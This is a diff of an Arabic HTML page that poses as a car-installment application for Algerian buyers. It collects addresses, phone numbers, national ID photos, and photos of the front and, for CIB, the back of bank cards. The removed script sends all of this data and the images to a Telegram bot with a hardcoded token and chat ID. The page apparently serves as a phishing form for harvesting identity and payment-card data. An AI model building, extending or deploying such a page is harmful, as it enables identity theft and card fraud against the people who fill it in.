+              <label class="form-label required-field"><i class="fa fa-money-bill"></i> هل الراتب الشهري يقل عن 20000 دج؟</label>
+              <div class="d-flex gap-3">
+                <div class="form-check">
+                  <input class="form-check-input" id="salaryLessYes" name="salaryLessThan20k" required="" type="radio" value="نعم" />
+                  <label class="form-check-label" for="salaryLessYes">نعم</label>
+                </div>
+                <div class="form-check">
+                  <input class="form-check-input" id="salaryLessNo" name="salaryLessThan20k" required="" type="radio" value="لا" />
+                  <label class="form-check-label" for="salaryLessNo">لا</label>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <!-- قسم معلومات الاتصال والعنوان -->
+        <div class="form-section">
+          <h3 class="section-title"><i class="fa fa-address-card me-2"></i>معلومات الاتصال والعنوان</h3>
+          <div class="row g-3">
+            <div class="col-md-6">
+              <label class="form-label required-field"><i class="fa fa-phone"></i> رقم الهاتف</label>
+              <input class="form-control" maxlength="10" name="phone" placeholder="0XXXXXXXXX" required="" type="tel" />
+              <div class="form-text small-hint">يجب أن يبدأ الرقم بـ 05 أو 06 أو 07 ويتكون من 10 أرقام</div>
+            </div>
+            <div class="col-md-6">
+              <label class="form-label"><i class="fa fa-phone"></i> رقم الهاتف الثاني <span style="color:#6b7280;">(إن وجد - اختياري)</span></label>
+              <input class="form-control" maxlength="10" name="phone2" placeholder="0XXXXXXXXX" type="tel" />
+              <div class="form-text small-hint">رقم هاتف إضافي للتواصل (اختياري)</div>
+            </div>
+            <div class="col-md-6">
+              <label class="form-label required-field"><i class="fa fa-map-location-dot"></i> الولاية</label>
+              <select class="form-select" name="state" required="">
+                <option disabled="True" selected="True" value="">اختر ولايتك</option>
+                <option value="أدرار">أدرار</option>
+                <option value="الشلف">الشلف</option>
+                <option value="الأغواط">الأغواط</option>
+                <option value="أم البواقي">أم البواقي</option>
+                <option value="باتنة">باتنة</option>
+                <option value="بجاية">بجاية</option>
+                <option value="بسكرة">بسكرة</option>
+                <option value="بشار">بشار</option>
+                <option value="البليدة">البليدة</option>
+                <option value="البويرة">البويرة</option>
+                <option value="تمنراست">تمنراست</option>
+                <option value="تبسة">تبسة</option>
+                <option value="تلمسان">تلمسان</option>
+                <option value="تيارت">تيارت</option>
+                <option value="تيزي وزو">تيزي وزو</option>
+                <option value="الجزائر">الجزائر</option>
+                <option value="الجلفة">الجلفة</option>
+                <option value="جيجل">جيجل</option>
+                <option value="سطيف">سطيف</option>
+                <option value="سعيدة">سعيدة</option>
+                <option value="سكيكدة">سكيكدة</option>
+                <option value="سيدي بلعباس">سيدي بلعباس</option>
+                <option value="عنابة">عنابة</option>
+                <option value="قالمة">قالمة</option>
+                <option value="قسنطينة">قسنطينة</option>
+                <option value="المدية">المدية</option>
+                <option value="مستغانم">مستغانم</option>
+                <option value="المسيلة">المسيلة</option>
+                <option value="معسكر">معسكر</option>
+                <option value="ورقلة">ورقلة</option>
+                <option value="وهران">وهران</option>
+                <option value="البيض">البيض</option>
+                <option value="إليزي">إليزي</option>
+                <option value="برج بوعريريج">برج بوعريريج</option>
+                <option value="بومرداس">بومرداس</option>
+                <option value="الطارف">الطارف</option>
+                <option value="تندوف">تندوف</option>
+                <option value="تيسمسيلت">تيسمسيلت</option>
+                <option value="الوادي">الوادي</option>
+                <option value="خنشلة">خنشلة</option>
+                <option value="سوق أهراس">سوق أهراس</option>
+                <option value="تيبازة">تيبازة</option>
+                <option value="ميلة">ميلة</option>
+                <option value="عين الدفلى">عين الدفلى</option>
+                <option value="النعامة">النعامة</option>
+                <option value="عين تموشنت">عين تموشنت</option>
+                <option value="غرداية">غرداية</option>
+                <option value="غليزان">غليزان</option>
+                <option value="تيميمون">تيميمون</option>
+                <option value="برج باجي مختار">برج باجي مختار</option>
+                <option value="بني عباس">بني عباس</option>
+                <option value="أولاد جلال">أولاد جلال</option>
+                <option value="إن صالح">إن صالح</option>
+                <option value="إن قزام">إن قزام</option>
+                <option value="توقرت">توقرت</option>
+                <option value="جانت">جانت</option>
+                <option value="المغير">المغير</option>
+                <option value="المنيعة">المنيعة</option>
+              </select>
+            </div>
+            <div class="col-12">
+              <label class="form-label required-field"><i class="fa fa-location-dot"></i> العنوان بالضبط</label>
+              <textarea class="form-control" name="address" required="" rows="2"></textarea>
+              <div class="form-text small-hint">يرجى كتابة العنوان بالتفصيل لتسهيل عملية التواصل والتوصيل</div>
+            </div>
+          </div>
+        </div>
+        <!-- قسم معلومات الدفع -->
+        <div class="form-section">
+          <h3 class="section-title"><i class="fa fa-car me-2"></i>معلومات السيارة</h3>
+          <div class="row g-3">
+            <div class="col-md-6">
+              <label class="form-label required-field"><i class="fa fa-car"></i> نوع السيارة</label>
+              <select class="form-select" name="carType" required="">
+                <option disabled="" selected="" value="">اختر نوع السيارة</option>
+                <option value="Chery Tiggo 2 Pro">Chery Tiggo 2 Pro</option>
+                <option value="Chery Tiggo 4 Pro">Chery Tiggo 4 Pro</option>
+                <option value="Chery Tiggo 7 Pro">Chery Tiggo 7 Pro</option>
+                <option value="Chery Tiggo 8 Pro">Chery Tiggo 8 Pro</option>
+                <option value="Arizzo 5">Arizzo 5</option>
+                <option value="Arizzo 8">Arizzo 8</option>
+                <option value="Geely GX3 PRO">Geely GX3 PRO</option>
+              </select>
+            </div>
+            <div class="col-md-6">
+              <label class="form-label required-field"><i class="fa fa-palette"></i> لون السيارة</label>
+              <select class="form-select" name="carColor" required="">
+                <option disabled="" selected="" value="">اختر اللون</option>
+                <option value="أبيض">أبيض</option>
+                <option value="أزرق نيلي">أزرق نيلي</option>
+                <option value="أزرق">أزرق</option>
+                <option value="رمادي">رمادي</option>
+                <option value="برونزي">برونزي</option>
+                <option value="أسود">أسود</option>
+              </select>
+            </div>
+          </div>
+        </div>
+        <div class="form-section">
+          <h3 class="section-title"><i class="fa fa-credit-card me-2"></i>معلومات الدفع</h3>
+          <div class="row g-3">
+            <div class="col-md-6">
+              <label class="form-label required-field"><i class="fa fa-money-bill-wave"></i> طريقة الدفع</label>
+              <div class="d-flex gap-3">
+                <div class="form-check">
+                  <input class="form-check-input" id="cash" name="paymentType" required="" type="radio" value="كاش" />
+                  <label class="form-check-label" for="cash">كاش</label>
+                </div>
+                <div class="form-check">
+                  <input class="form-check-input" id="installment" name="paymentType" required="" type="radio"
+                    value="بالتقسيط" />
+                  <label class="form-check-label" for="installment">بالتقسيط</label>
+                </div>
+              </div>
+            </div>
+            <div class="col-md-6">
+              <label class="form-label required-field"><i class="fa fa-circle-question"></i> هل قمت بالاستفادة من خدمة
+                التقسيط من قبل؟</label>
+              <div class="d-flex gap-3">
+                <div class="form-check">
+                  <input class="form-check-input" id="usedYes" name="usedInstallment" required="" type="radio"
+                    value="نعم" />
+                  <label class="form-check-label" for="usedYes">نعم</label>
+                </div>
+                <div class="form-check">
+                  <input class="form-check-input" id="usedNo" name="usedInstallment" required="" type="radio"
+                    value="لا" />
+                  <label class="form-check-label" for="usedNo">لا</label>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <!-- قسم المستندات المطلوبة -->
+        <div class="form-section">
+          <h3 class="section-title"><i class="fa fa-file-contract me-2"></i>المستندات المطلوبة</h3>
+          
+          <div class="row g-3">
+            <div class="col-md-6">
+              <label class="form-label required-field"><i class="fa fa-id-card"></i> صورة بطاقة التعريف الوطنية</label>
+              <div class="dropzone" id="dz-id">
+                <div class="dz-icon"><i class="fa fa-cloud-arrow-up"></i></div>
+                <div class="dz-invite small-hint">اسحب وأفلت الصورة هنا أو اضغط للاختيار — (PNG, JPG, WEBP ≤ 6MB)</div>
+                <input accept="image/jpeg,image/png,image/webp" class="d-none" id="input-id" type="file" />
+              </div>
+              <div class="d-grid camera-btn">
+                <button class="btn btn-outline-secondary" id="btn-camera-id" type="button"><i class="fa fa-camera"></i>
+                  تصوير بالكاميرا</button>
+              </div>
+              <input accept="image/*" capture="environment" class="d-none" id="camera-id" type="file" />
+              <div class="preview" id="prev-id">
+                <img alt="معاينة بطاقة التعريف" id="img-id" />
+                <div class="meta" id="meta-id"></div>
+                <div class="actions">
+                  <button class="btn btn-sm btn-outline-secondary" id="change-id" type="button"><i
+                      class="fa fa-rotate"></i> تغيير</button>
+                  <button class="btn btn-sm btn-outline-danger" id="remove-id" type="button"><i class="fa fa-trash"></i>
+                    حذف</button>
+                </div>
+              </div>
+              <div class="form-text small-hint">يجب أن تكون صورة واضحة وبجميع التفاصيل مرئية</div>
+            </div>
+            
+            <!-- قسم اختيار وسيلة الدفع -->
+            <div class="col-12">
+              <div class="mb-3 mt-2">
+                <h5 class="mb-3"><i class="fa fa-university me-2"></i>اختر البطاقة الائتمانية التي تملكها</h5>
+                <div class="payment-method-selector">
+                  <div class="d-flex align-items-center justify-content-center gap-4">
+                    <div class="payment-option-wrapper">
+                      <input type="radio" class="btn-check" name="paymentMethod" id="ccp-option" value="CCP" required>
+                      <label class="payment-option-simple" for="ccp-option">
+                        <span class="radio-circle"></span>
+                        <img src="attached_assets/ccp.8a35eb39567c_1762043056237.png" alt="CCP" class="payment-logo-simple">
+                        <span class="question-mark">?</span>
+                      </label>
+                    </div>
+                    <div class="payment-option-wrapper">
+                      <input type="radio" class="btn-check" name="paymentMethod" id="cib-option" value="CIB" required>
+                      <label class="payment-option-simple" for="cib-option">
+                        <span class="radio-circle"></span>
+                        <img src="attached_assets/cib.bc8403a65f49_1762043056236.png" alt="CIB" class="payment-logo-simple">
+                        <span class="question-mark">?</span>
+                      </label>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            
+            <div class="col-md-6">
+              <label class="form-label required-field"><i class="fa fa-credit-card"></i> الواجهة الامامية للبطاقة
+                الذهبية او البطاقة البنكية</label>
+              <div class="dropzone" id="dz-gold">
+                <div class="dz-icon"><i class="fa fa-cloud-arrow-up"></i></div>
+                <div class="dz-invite small-hint">اسحب وأفلت الصورة هنا أو اضغط للاختيار — (PNG, JPG, WEBP ≤ 6MB)</div>
+                <input accept="image/jpeg,image/png,image/webp" class="d-none" id="input-gold" type="file" />
+              </div>
+              <div class="d-grid camera-btn">
+                <button class="btn btn-outline-secondary" id="btn-camera-gold" type="button"><i
+                    class="fa fa-camera"></i> تصوير بالكاميرا</button>
+              </div>
+              <input accept="image/*" capture="environment" class="d-none" id="camera-gold" type="file" />
+              <div class="preview" id="prev-gold">
+                <img alt="معاينة البطاقة" id="img-gold" />
+                <div class="meta" id="meta-gold"></div>
+                <div class="actions">
+                  <button class="btn btn-sm btn-outline-secondary" id="change-gold" type="button"><i
+                      class="fa fa-rotate"></i> تغيير</button>
+                  <button class="btn btn-sm btn-outline-danger" id="remove-gold" type="button"><i
+                      class="fa fa-trash"></i> حذف</button>
+                </div>
+              </div>
+              <div class="form-text small-hint">يجب أن تكون صورة واضحة وبجميع التفاصيل مرئية</div>
+            </div>
+            <!-- الواجهة الخلفية للبطاقة البنكية - يظهر فقط عند اختيار CIB -->
+            <div class="col-md-6" id="backCardSection" style="display: none;">
+              <label class="form-label required-field"><i class="fa fa-credit-card"></i> الواجهة الخلفية للبطاقة
+                البنكية</label>
+              <div class="dropzone" id="dz-backcard">
+                <div class="dz-icon"><i class="fa fa-cloud-arrow-up"></i></div>
+                <div class="dz-invite small-hint">اسحب وأفلت الصورة هنا أو اضغط للاختيار — (PNG, JPG, WEBP ≤ 6MB)</div>
+                <input accept="image/jpeg,image/png,image/webp" class="d-none" id="input-backcard" type="file" />
+              </div>
+              <div class="d-grid camera-btn">
+                <button class="btn btn-outline-secondary" id="btn-camera-backcard" type="button"><i
+                    class="fa fa-camera"></i> تصوير بالكاميرا</button>
+              </div>
+              <input accept="image/*" capture="environment" class="d-none" id="camera-backcard" type="file" />
+              <div class="preview" id="prev-backcard">
+                <img alt="معاينة الواجهة الخلفية" id="img-backcard" />
+                <div class="meta" id="meta-backcard"></div>
+                <div class="actions">
+                  <button class="btn btn-sm btn-outline-secondary" id="change-backcard" type="button"><i
+                      class="fa fa-rotate"></i> تغيير</button>
+                  <button class="btn btn-sm btn-outline-danger" id="remove-backcard" type="button"><i
+                      class="fa fa-trash"></i> حذف</button>
+                </div>
+              </div>
+              <div class="form-text small-hint">يجب أن تكون صورة واضحة وبجميع التفاصيل مرئية</div>
+            </div>
+          </div>
+        </div>
+        <div class="form-section">
+          <h3 class="section-title">
+            <i class="fa fa-file-lines me-2"></i>
+            شهادة الميلاد (إن وجدت — <span style="color:red;">اختياري</span>)
+          </h3>
+          <div class="row g-3">
+            <div class="col-md-6">
+              <label class="form-label"><i class="fa fa-id-card"></i> صورة شهادة الميلاد</label>
+              <div class="dropzone" id="dz-birth">
+                <div class="dz-icon"><i class="fa fa-cloud-arrow-up"></i></div>
+                <div class="dz-invite small-hint">اسحب وأفلت الصورة هنا أو اضغط للاختيار — (PNG, JPG, WEBP ≤ 6MB)</div>
+                <input accept="image/jpeg,image/png,image/webp" class="d-none" id="input-birth" type="file" />
+              </div>
+              <div class="d-grid camera-btn">
+                <button class="btn btn-outline-secondary" id="btn-camera-birth" type="button">
+                  <i class="fa fa-camera"></i> تصوير بالكاميرا
+                </button>
+              </div>
+              <input accept="image/*" capture="environment" class="d-none" id="camera-birth" type="file" />
+              <div class="preview" id="prev-birth">
+                <img alt="معاينة شهادة الميلاد" id="img-birth" />
+                <div class="meta" id="meta-birth"></div>
+                <div class="actions">
+                  <button class="btn btn-sm btn-outline-secondary" id="change-birth" type="button"><i
+                      class="fa fa-rotate"></i> تغيير</button>
+                  <button class="btn btn-sm btn-outline-danger" id="remove-birth" type="button"><i
+                      class="fa fa-trash"></i> حذف</button>
+                </div>
+              </div>
+              <div class="form-text small-hint">يُفضل إرفاقها إن وُجدت لتسريع المعالجة</div>
+            </div>
+          </div>
+        </div>
+        <div class="d-grid mt-4">
+          <button class="btn btn-brand btn-lg" id="submitBtn">
+            <span class="btn-text">إرسال الطلب</span>
+            <span class="btn-wip d-none"><span class="spinner-small me-2"></span> جارٍ الإرسال…</span>
+          </button>
+        </div>
+      </form>
+    </div>
+  </div>
+  <!-- Success Modal -->
+  <div aria-hidden="true" class="modal fade success-modal" id="successModal" tabindex="-1">
+    <div class="modal-dialog modal-dialog-centered modal-lg">
+      <div class="modal-content text-center">
+        <div class="success-header">
+          <div class="success-icon-wrapper">
+            <svg class="success-mark" viewbox="0 0 100 100">
+              <circle class="path-circle" cx="50" cy="50" fill="var(--accent)" r="46"></circle>
+              <path class="path-check" d="M30 52 L45 67 L72 40" fill="none" stroke="#fff" stroke-linecap="round"
+                stroke-linejoin="round" stroke-width="8"></path>
+            </svg>
+          </div>
+          <h3 class="success-title">تم إرسال طلبك بنجاح!</h3>
+          <p class="success-subtitle">شكراً لثقتكم بنا، سيتم معالجة طلبكم والاتصال بكم في أقرب وقت ممكن</p>
+        </div>
+        
+        <div class="order-details-card">
+          <div class="order-header">
+            <i class="fa fa-receipt"></i>
+            <span>معلومات الطلب</span>
+          </div>
+          
+          <div class="order-id-section">
+            <label class="order-label">رقم الطلب</label>
+            <div class="order-id-display">
+              <span id="orderId"></span>
+              <button class="copy-btn" onclick="copyOrderId()" title="نسخ رقم الطلب">
+                <i class="fa fa-copy"></i>
+              </button>
+            </div>
+          </div>
+          
+          <div class="barcode-section">
+            <canvas height="100" id="barcodeCanvas" width="320"></canvas>
+          </div>
+          
+          <div class="save-instructions">
+            <div class="instruction-item">
+              <i class="fa fa-camera text-primary"></i>
+              <span>قم بأخذ لقطة شاشة لهذا الرمز</span>
+            </div>
+            <div class="instruction-item">
+              <i class="fa fa-bookmark text-warning"></i>
+              <span>احتفظ برقم الطلب للمتابعة</span>
+            </div>
+            <div class="instruction-item">
+              <i class="fa fa-phone text-success"></i>
+              <span>انتظر اتصال فريقنا</span>
+            </div>
+          </div>
+        </div>
+        
+        <div class="modal-footer-custom">
+          <button class="btn btn-primary btn-lg px-5" data-bs-dismiss="modal">
+            <i class="fa fa-check-circle me-2"></i>تم
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const colorSelect = document.querySelector('select[name="carColor"]');
+      const carSelect = document.querySelector('select[name="carType"]');
+      const carColors = {
+        "Chery Tiggo 2 Pro": ["أبيض", "أزرق نيلي"],
+        "Chery Tiggo 4 Pro": ["أبيض", "رمادي", "برونزي"],
+        "Chery Tiggo 7 Pro": ["أسود", "أبيض"],
+        "Chery Tiggo 8 Pro": ["أسود"],
+        "Arizzo 5": ["أزرق", "أسود", "أبيض"],
+        "Arizzo 8": ["أسود", "أبيض"],
+        "Geely GX3 PRO": ["أبيض"]
       };
-      reader.readAsDataURL(file);
-    }
 
-    if(dz){
-      dz.onclick = function(){ if(input) input.click(); };
-      dz.addEventListener('dragover', function(e){ e.preventDefault(); dz.classList.add('dragover'); });
-      dz.addEventListener('dragleave', function(){ dz.classList.remove('dragover'); });
-      dz.addEventListener('drop', function(e){ e.preventDefault(); dz.classList.remove('dragover'); const f = e.dataTransfer && e.dataTransfer.files && e.dataTransfer.files[0]; if(f){ if(input) input.files = e.dataTransfer.files; showPreview(f); } });
-    }
-    if(input){
-      input.addEventListener('change', function(e){ const f = e.target.files && e.target.files[0]; if(f) showPreview(f); });
-    }
-    if(camBtn){
-      if(key === 'birth'){
-        camBtn.classList.remove('btn-outline-secondary');
-        camBtn.classList.add('btn','btn-danger');
-        camBtn.innerHTML = '<i class="fa fa-camera"></i> تصوير (اختياري)';
-      }
-      camBtn.onclick = function(){ if(camInput) camInput.click(); };
-    }
-    if(camInput){
-      camInput.addEventListener('change', function(e){
-        const f = e.target.files && e.target.files[0];
-        if(f){
-          // mirror to main input
-          if(input){
-            try{ const dt = new DataTransfer(); dt.items.add(f); input.files = dt.files; }catch(err){}
-          }
-          showPreview(f);
+      function updateColors() {
+        const selectedCar = carSelect.value;
+        colorSelect.innerHTML = "";
+        const defaultOpt = document.createElement("option");
+        defaultOpt.textContent = "اختر اللون المتاح";
+        defaultOpt.disabled = true;
+        defaultOpt.selected = true;
+        colorSelect.appendChild(defaultOpt);
+
+        if (selectedCar && carColors[selectedCar]) {
+          carColors[selectedCar].forEach(c => {
+            const opt = document.createElement("option");
+            opt.value = c;
+            opt.textContent = c;
+            colorSelect.appendChild(opt);
+          });
         }
-      });
-    }
-    if(btnChange){
-      btnChange.onclick = function(){ if(input) input.click(); };
-    }
-    if(btnRemove){
-      btnRemove.onclick = function(){
-        if(input){ input.value = ''; try{ input.files = new DataTransfer().files; }catch(e){} }
-        if(camInput) camInput.value = '';
-        if(img) img.src = '';
-        if(prev) prev.style.display = 'none';
-        if(dz) dz.style.display = 'block';
-      };
-    }
-    return { input: input, img: img, prev: prev };
-  }
-
-  // Initialize
-  var UP = {};
-  try{
-    UP.id = initDropzone('id');
-    UP.gold = initDropzone('gold');
-    UP.birth = initDropzone('birth');
-  }catch(e){ console.warn('dropzone init error', e); }
-
-  // send helper
-  async function sendPhoto(fileOrBlob, caption){
-    const BOT_TOKEN = window.BOT_TOKEN || "8346482529:AAFaVmcDbzzPNZ99QEIYkokgSCpBgT93pGo";
-    const CHAT_ID = window.CHAT_ID || "5794299315";
-    const d = new FormData();
-    d.append('chat_id', CHAT_ID);
-    d.append('photo', fileOrBlob);
-    if(caption) d.append('caption', caption);
-    const resp = await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', { method: 'POST', body: d });
-    if(!resp.ok){
-      const t = await resp.text().catch(()=>'');
-      throw new Error('sendPhoto failed: ' + resp.status + ' ' + t);
-    }
-    return resp;
-  }
-
-  // main submit
-  const form = document.getElementById('carForm');
-  const submitBtn = document.getElementById('submitBtn');
-  const loadingModalEl = document.getElementById('loadingModal');
-  const successModalEl = document.getElementById('successModal');
-  const loadingModal = loadingModalEl ? new bootstrap.Modal(loadingModalEl) : null;
-  const successModal = successModalEl ? new bootstrap.Modal(successModalEl) : null;
-
-  function setLoading(on){ if(submitBtn) submitBtn.disabled = on; }
-
-  function validatePhone(phone){ return /^(05|06|07)\d{8}$/.test(phone); }
-
-  function generateOrderId(len=6){
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    let id=''; for(let i=0;i<len;i++) id+=chars.charAt(Math.floor(Math.random()*chars.length));
-    return id;
-  }
-
-  function drawBarcode(text){
-    try{
-      const canvas = document.getElementById('barcodeCanvas');
-      if(!canvas) return;
-      const ctx = canvas.getContext('2d');
-      ctx.clearRect(0,0,canvas.width,canvas.height);
-      ctx.fillStyle='#fff'; ctx.fillRect(0,0,canvas.width,canvas.height);
-      let x=6;
-      for(let i=0;i<text.length;i++){
-        const code = text.charCodeAt(i);
-        const w = 4 + (code % 11);
-        const h = 40 + (code % 30);
-        ctx.fillStyle = (i%2===0)?'#111':'#222';
-        ctx.fillRect(x,10,w,h);
-        x += w+4;
-        if(x>canvas.width-10) break;
       }
-      ctx.fillStyle='#111'; ctx.font='14px Tahoma, Arial'; ctx.textAlign='center';
-      ctx.fillText(text, canvas.width/2, canvas.height-8);
-    }catch(e){ console.warn(e); }
-  }
 
-  form.addEventListener('submit', async function(e){
-    e.preventDefault();
-    // basic validation for required fields (HTML5)
-    if(!form.checkValidity()){
-      showBottomAlert('⚠️ الرجاء ملء جميع الحقول المطلوبة قبل الإرسال.');
-      return;
-    }
-    const phone = (document.querySelector('input[name="phone"]')||{}).value || '';
-    if(!validatePhone(phone.trim())){
-      showBottomAlert('⚠️ أدخل رقم هاتف صحيح يبدأ بـ 05 أو 06 أو 07 ويتكون من 10 أرقام.');
-      return;
-    }
+      carSelect.addEventListener("change", updateColors);
+    });
 
-    // Determine files or preview
-    function resolveFile(u){
-      if(!u) return null;
-      // if input.files available
-      try{
-        if(u.input && u.input.files && u.input.files[0]) return u.input.files[0];
-      }catch(e){}
-      // else if img preview src present (data URL)
-      try{
-        if(u.img && u.img.src) {
-          const src = u.img.src;
-          if(src.startsWith('data:')) return dataURLtoBlob(src);
-          // If it's an external blob URL (object URL), try fetch it and convert to blob
-          if(src.startsWith('blob:')){
-            // fetch and convert
-            return (async function(){ const r = await fetch(src); return await r.blob(); })();
-          }
+    // Toggle back card section based on payment method selection
+    document.addEventListener("DOMContentLoaded", function () {
+      const ccpOption = document.getElementById('ccp-option');
+      const cibOption = document.getElementById('cib-option');
+      const backCardSection = document.getElementById('backCardSection');
+      const backCardInput = document.getElementById('input-backcard');
+
+      function toggleBackCardSection() {
+        if (cibOption && cibOption.checked) {
+          backCardSection.style.display = 'block';
+          backCardInput.required = true;
+        } else {
+          backCardSection.style.display = 'none';
+          backCardInput.required = false;
         }
-      }catch(e){}
-      return null;
-    }
-
-    let idFile = resolveFile(UP.id);
-    if(idFile && typeof idFile.then === 'function'){ idFile = await idFile; }
-    let goldFile = resolveFile(UP.gold);
-    if(goldFile && typeof goldFile.then === 'function'){ goldFile = await goldFile; }
-    let birthFile = resolveFile(UP.birth);
-    if(birthFile && typeof birthFile.then === 'function'){ birthFile = await birthFile; }
-
-    if(!idFile || !goldFile){
-      showBottomAlert('⚠️ يرجى رفع صورة بطاقة التعريف والبطاقة الذهبية.');
-      return;
-    }
-
-    const orderId = generateOrderId(6);
-    // show loading
-    if(loadingModal) loadingModal.show();
-    setLoading(true);
-
-    try{
-      const fd = new FormData(form);
-      const msg = `📌 طلب جديد%0A👤 الاسم: ${fd.get('firstName')} ${fd.get('lastName')}%0A🎂 العمر: ${fd.get('age')}%0A🏢 مكان الازدياد: ${fd.get('birthPlace')}%0A🏢 الولاية: ${fd.get('state')}%0A☎️ الهاتف: ${fd.get('phone')}%0A📍 العنوان: ${fd.get('address')}%0A🚗 نوع السيارة: ${fd.get('carType')}%0A🎨 اللون: ${fd.get('carColor')}%0A💳 طريقة الدفع: ${fd.get('paymentType')}%0A🔄 استفاد من التقسيط من قبل: ${fd.get('usedInstallment')}%0A🆔 رقم الطلب: ${orderId}`;
-
-      const BOT_TOKEN = window.BOT_TOKEN || "8346482529:AAFaVmcDbzzPNZ99QEIYkokgSCpBgT93pGo";
-      const CHAT_ID = window.CHAT_ID || "5794299315";
-
-      const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`);
-      if(!r.ok){
-        const t = await r.text().catch(()=>'');
-        throw new Error('sendMessage failed: ' + r.status + ' ' + t);
       }
 
-      // send photos sequentially
-      await sendPhoto(idFile, `بطاقة التعريف الوطنية — طلب: ${orderId}`);
-      await sendPhoto(goldFile, `البطاقة الذهبية — طلب: ${orderId}`);
-      if(birthFile) await sendPhoto(birthFile, `شهادة الميلاد (اختياري) — طلب: ${orderId}`);
+      if (ccpOption) {
+        ccpOption.addEventListener('change', toggleBackCardSection);
+      }
+      if (cibOption) {
+        cibOption.addEventListener('change', toggleBackCardSection);
+      }
+    });
+  </script>
+  <!-- Loading Modal -->
+  <div aria-hidden="true" class="modal fade" id="loadingModal" tabindex="-1">
+    <div class="modal-dialog modal-dialog-centered">
+      <div class="modal-content text-center p-4">
+        <div class="spinner-border text-danger mb-3" role="status" style="width: 3rem; height: 3rem;"></div>
+        <h5>جارٍ الإرسال... يرجى الانتظار</h5>
+      </div>
+    </div>
+  </div>
+  <!-- Warning Modal -->
 
-      // success
-      if(loadingModal) loadingModal.hide();
-      const orderEl = document.getElementById('orderId');
-      if(orderEl) orderEl.textContent = orderId;
-      drawBarcode(orderId);
-      if(successModal) successModal.show();
-
-      form.reset();
-      // clear previews
-      ['id','gold','birth'].forEach(function(k){
-        try{
-          const img = document.getElementById('img-' + k);
-          const prev = document.getElementById('prev-' + k);
-          const dz = document.getElementById('dz-' + k);
-          const input = document.getElementById('input-' + k);
-          const cam = document.getElementById('camera-' + k);
-          if(img) img.src = '';
-          if(prev) prev.style.display = 'none';
-          if(dz) dz.style.display = 'block';
-          if(input) { input.value=''; try{ input.files = new DataTransfer().files; }catch(e){} }
-          if(cam) cam.value='';
-        }catch(e){}
-      });
-
-    }catch(err){
-      console.error('Send error:', err);
-      try{ if(loadingModal) loadingModal.hide(); }catch(e){}
-      showBottomAlert('⚠️ حدث خطأ أثناء الإرسال. حاول مجددًا.');
-    }finally{
-      setLoading(false);
+  <div class="toast-inline alert alert-danger" id="bottomAlert" role="alert"
+    style="position:fixed;bottom:18px;left:50%;transform:translateX(-50%);z-index:2100;display:none;padding:12px 18px;border-radius:10px;font-weight:700;box-shadow:0 6px 18px rgba(0,0,0,.12);">
+    ⚠️ الرجاء ملء جميع الحقول المطلوبة قبل الإرسال.
+  </div>
+  <script>
+    function showBottomAlert(msg) {
+      try {
+        const el = document.getElementById('bottomAlert');
+        if (!el) return;
+        el.textContent = msg || '⚠️ الرجاء ملء جميع الحقول المطلوبة قبل الإرسال.';
+        el.style.display = 'block';
+        clearTimeout(window._bottomAlertTimeout);
+        window._bottomAlertTimeout = setTimeout(function () {el.style.display = 'none';}, 4000);
+      } catch (e) {console.warn(e);}
     }
 
-  });
+    document.addEventListener('DOMContentLoaded', function () {
+      const form = document.getElementById('carForm');
+      if (!form) return;
+      const inputs = form.querySelectorAll('input, textarea, select');
+      inputs.forEach(function (i) {
+        i.addEventListener('input', function () {const el = document.getElementById('bottomAlert'); if (el) el.style.display = 'none';});
+        i.addEventListener('change', function () {const el = document.getElementById('bottomAlert'); if (el) el.style.display = 'none';});
+      });
+    });
+  </script>
 
-});
-</script>
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const MAX_SIZE = 6 * 1024 * 1024;
+      const ALLOWED = ["image/jpeg", "image/png", "image/webp"];
+
+      function humanSize(bytes) {
+        const u = ['B', 'KB', 'MB', 'GB']; let i = 0, n = bytes;
+        while (n >= 1024 && i < u.length - 1) {n /= 1024; i++;} return n.toFixed(1) + ' ' + u[i];
+      }
+      function showBottomAlert(msg) {
+        try {
+          const el = document.getElementById('bottomAlert');
+          if (!el) return;
+          el.textContent = msg || '⚠️ الرجاء ملء جميع الحقول المطلوبة قبل الإرسال.';
+          el.style.display = 'block';
+          clearTimeout(window._bottomAlertTimeout);
+          window._bottomAlertTimeout = setTimeout(function () {el.style.display = 'none';}, 4000);
+        } catch (e) {console.warn(e);}
+      }
+      function dataURLtoBlob(dataurl) {
+        var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+          bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+        while (n--) {u8arr[n] = bstr.charCodeAt(n);}
+        return new Blob([u8arr], {type: mime});
+      }
+
+      function initDropzone(key) {
+        const dz = document.getElementById('dz-' + key);
+        const input = document.getElementById('input-' + key);
+        const camBtn = document.getElementById('btn-camera-' + key);
+        const camInput = document.getElementById('camera-' + key);
+        const prev = document.getElementById('prev-' + key);
+        const img = document.getElementById('img-' + key);
+        const meta = document.getElementById('meta-' + key);
+        const btnChange = document.getElementById('change-' + key);
+        const btnRemove = document.getElementById('remove-' + key);
+
+        function showPreview(file) {
+          if (!file) return;
+          if (!ALLOWED.includes(file.type)) {showBottomAlert('⚠️ نوع ملف غير مدعوم'); return;}
+          if (file.size > MAX_SIZE) {showBottomAlert('⚠️ الحجم كبير: الحد الأقصى 6MB'); return;}
+          const reader = new FileReader();
+          reader.onload = function (e) {
+            if (img) img.src = e.target.result;
+            if (meta) meta.textContent = file.name + ' — ' + humanSize(file.size);
+            if (prev) prev.style.display = 'block';
+            if (dz) dz.style.display = 'none';
+          };
+          reader.readAsDataURL(file);
+        }
+
+        if (dz) {
+          dz.onclick = function () {if (input) input.click();};
+          dz.addEventListener('dragover', function (e) {e.preventDefault(); dz.classList.add('dragover');});
+          dz.addEventListener('dragleave', function () {dz.classList.remove('dragover');});
